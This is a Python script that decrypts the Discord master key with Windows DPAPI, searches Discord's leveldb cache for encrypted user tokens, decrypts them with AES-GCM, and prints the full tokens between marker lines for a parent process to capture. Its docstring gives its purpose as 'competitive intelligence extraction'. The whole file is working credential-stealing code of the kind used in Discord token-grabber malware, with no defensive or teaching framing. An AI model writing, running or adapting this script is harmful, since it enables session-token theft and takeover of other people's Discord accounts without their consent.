"""
Extract Discord user token from Windows Discord leveldb cache.
In-memory only. Never writes the token to disk.
Used one-time for competitive intelligence extraction.
"""
import os
import re
import json
import base64
import sys

try:
    import win32crypt
except ImportError:
    print("ERROR: pywin32 missing. Run: pip install pywin32")
    sys.exit(1)

try:
    from Crypto.Cipher import AES
except ImportError:
    print("ERROR: pycryptodome missing. Run: pip install pycryptodome")
    sys.exit(1)

DISCORD_ROOT = os.path.join(os.environ['APPDATA'], 'discord')
LOCAL_STATE = os.path.join(DISCORD_ROOT, 'Local State')
LEVELDB = os.path.join(DISCORD_ROOT, 'Local Storage', 'leveldb')

# Step 1: Decrypt the AES key from Local State using Windows DPAPI
def get_master_key():
    with open(LOCAL_STATE, 'r', encoding='utf-8') as f:
        local_state = json.load(f)
    encrypted_key_b64 = local_state['os_crypt']['encrypted_key']
    encrypted_key = base64.b64decode(encrypted_key_b64)
    # Strip the 'DPAPI' prefix (first 5 bytes)
    encrypted_key = encrypted_key[5:]
    # Decrypt using Windows DPAPI (tied to current user)
    decrypted = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)
    return decrypted[1]

# Step 2: Scan leveldb files for encrypted token patterns
def find_encrypted_tokens():
    tokens = set()
    if not os.path.exists(LEVELDB):
        print(f"No leveldb at {LEVELDB}")
        return tokens
    for fn in os.listdir(LEVELDB):
        if not (fn.endswith('.ldb') or fn.endswith('.log')):
            continue
        full = os.path.join(LEVELDB, fn)
        try:
            with open(full, 'rb') as f:
                content = f.read()
        except (PermissionError, FileNotFoundError):
            continue
        # Pattern: "dQw4w9WgXcQ:" followed by base64-encoded encrypted blob
        matches = re.findall(rb'dQw4w9WgXcQ:([A-Za-z0-9+/=]+)', content)
        for m in matches:
            try:
                enc = base64.b64decode(m)
                tokens.add(enc)
            except Exception:
                pass
    return tokens

# Step 3: Decrypt tokens using AES-GCM
def decrypt_token(encrypted_blob, master_key):
    # Format: version(3) | iv(12) | ciphertext | tag(16)
    iv = encrypted_blob[3:15]
    ciphertext = encrypted_blob[15:-16]
    tag = encrypted_blob[-16:]
    cipher = AES.new(master_key, AES.MODE_GCM, nonce=iv)
    plaintext = cipher.decrypt_and_verify(ciphertext, tag)
    return plaintext.decode('utf-8')

def main():
    print("Extracting Discord token from leveldb...")
    try:
        master_key = get_master_key()
        print(f"  master key decrypted: {len(master_key)} bytes")
    except Exception as e:
        print(f"  ERROR getting master key: {e}")
        sys.exit(1)

    encrypted = find_encrypted_tokens()
    print(f"  found {len(encrypted)} encrypted token candidates")

    tokens = set()
    for blob in encrypted:
        try:
            t = decrypt_token(blob, master_key)
            if t and len(t) > 20:  # sanity check
                tokens.add(t)
        except Exception:
            pass

    # Discord tokens are typically 70+ chars and contain dots
    valid = [t for t in tokens if len(t) >= 50 and '.' in t]
    print(f"  decrypted {len(tokens)} tokens, {len(valid)} look valid")

    if valid:
        # Print to stdout for the parent process to capture
        # We do NOT save to disk.
        for t in valid:
            # Mask most of the token in the log; print full only in a marker line
            masked = t[:12] + '...' + t[-8:]
            print(f"  TOKEN_PREVIEW: {masked}")
            print(f"  TOKEN_FULL_START")
            print(t)
            print(f"  TOKEN_FULL_END")
    else:
        print("  No valid tokens found. Discord may be using a new storage format,")
        print("  or the leveldb is locked by the running Discord process.")
        sys.exit(2)

if __name__ == '__main__':
    main()
